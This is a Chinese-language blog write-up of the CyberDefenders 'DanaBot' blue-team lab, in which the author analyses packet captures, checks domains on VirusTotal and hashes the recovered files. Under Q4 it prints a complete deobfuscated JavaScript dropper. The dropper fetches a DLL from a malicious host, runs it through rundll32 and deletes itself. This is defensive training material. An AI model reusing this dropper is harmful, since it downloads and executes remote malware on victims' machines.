---
title: DanaBot Lab
published: 2025-08-02
updated: 2025-08-03
description: "CyberDefenders DanaBot Lab writeup"
image: ""
tags: ["CyberDefenders", "Blue Team CTF"]
category: "CyberDefenders"
draft: false
---

跟鯨魚諮詢完之後知道有 blue team ctf (再次謝謝鯨魚)  
不能白問，挑我最喜歡的看封包 lab 練一下  
甚麼時候換題目類型...看心情 xd

# DanaBot Lab

[Lab 連結](https://cyberdefenders.org/blueteam-ctf-challenges/danabot/)

## Q1

在封包中看到 `portfolio.serveirc.com` ，用 [VirusTotal](https://www.virustotal.com/gui/home/upload) 查詢這個 domain

![](/assets/cyberdefenders/DanaBot_Lab/IMG-20250808205058814.png)

在 wireshark 裡面看到關於 `portfolio.serveirc.com` 的其中一條出現 ip

![](/assets/cyberdefenders/DanaBot_Lab/IMG-20250808205058888.png)
所以初始存取的 ip 是 `62.173.142.148`

![](/assets/cyberdefenders/DanaBot_Lab/IMG-20250808205058943.png)

> Note: 可以用 VirusTotal 去確認一個網站的信譽

## Q2

在第一次登入看到混淆過的 JavaScript 程式碼，先用線上工具看看能不能解混淆

![](/assets/cyberdefenders/DanaBot_Lab/IMG-20250808205058991.png)

根據解混淆後的程式碼，可以知道應該是使用了`.dll` 並 random 了 10 個字母作為檔案名稱  
(看起來像是下一題的部分)

然後再仔細看一眼封包，就發現檔案名稱是`allegato_708.js`

![](/assets/cyberdefenders/DanaBot_Lab/IMG-20250808205059042.png)

![](/assets/cyberdefenders/DanaBot_Lab/IMG-20250808205059081.png)

## Q3

在 `File > Export Objects > HTTP` 找到第一個惡意程式，用 `sha256sum` 可以找到 SHA-256 hash

```bash
sha256sum login.php
```

![](/assets/cyberdefenders/DanaBot_Lab/IMG-20250808205059122.png)

## Q4

Windows 系統執行 `.js` 檔案是由內建的 `wscript.exe` 或是 `cscript.exe` 負責執行的

```javascript
function _0x414360(_0x5c5160) {
  var _0x119065 = "";
  var _0x5a393f = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".length;
  for (var _0x3d45b7 = 0x0; _0x3d45b7 < _0x5c5160; _0x3d45b7++) {
    _0x119065 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(
      Math.floor(Math.random() * _0x5a393f)
    );
  }
  return _0x119065 + ".dll";
}
var _0x48a85a = _0x414360(0xa);
var _0x44bdd9 =
  new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(0x2) +
  "\\" +
  _0x48a85a;
var _0x5da57f = WScript.CreateObject("MSXML2.XMLHTTP");
_0x5da57f.Open("GET", "http://soundata.top/resources.dll", false);
_0x5da57f.Send();
if (_0x5da57f.Status == 0xc8) {
  var _0x3c8952 = WScript.CreateObject("ADODB.Stream");
  _0x3c8952.Open();
  _0x3c8952.Type = 0x1;
  _0x3c8952.Write(_0x5da57f.ResponseBody);
  _0x3c8952.Position = 0x0;
  _0x3c8952.SaveToFile(_0x44bdd9, 0x2);
  _0x3c8952.Close();
  var _0x1e16b0 = WScript.CreateObject("Wscript.Shell");
  _0x1e16b0.Run("rundll32.exe /B " + _0x44bdd9 + ",start", 0x0, true);
}
new ActiveXObject("Scripting.FileSystemObject").DeleteFile(
  WScript.ScriptFullName
);
```

從 `Wscript.Shell` 可以看出是用 `wscript.exe` 來執行的

![](/assets/cyberdefenders/DanaBot_Lab/IMG-20250808205059159.png)

## Q5

在 `GET /resources.dll` 裡有一行 `This program cannot be run in DOS mode.` ，然後接下來就是很多的 DoS 紀錄

![](/assets/cyberdefenders/DanaBot_Lab/IMG-20250808205059213.png)

所以第二個惡意程式的檔案副檔名就是 `.dll`

![](/assets/cyberdefenders/DanaBot_Lab/IMG-20250808205059257.png)

## Q6

最後用 `md5sum` 可以找到 MD5 hash

```bash
md5sum resources.dll
```

---

```txt
I successfully completed DanaBot Blue Team Lab at @CyberDefenders!
https://cyberdefenders.org/blueteam-ctf-challenges/achievements/n1ght0w1/danabot/

#CyberDefenders #CyberSecurity #BlueYard #BlueTeam #InfoSec #SOC #SOCAnalyst #DFIR #CCD #CyberDefender
```

---

## 工具

[VirusTotal](https://www.virustotal.com/gui/home/upload)
可以確認 IP 的信譽

[Obfuscator.io Deobfuscator](https://obf-io.deobfuscate.io/)
解 JavaScript 混淆

[# synchrony](https://deobfuscate.relative.im/)
解 JavaScript 混淆
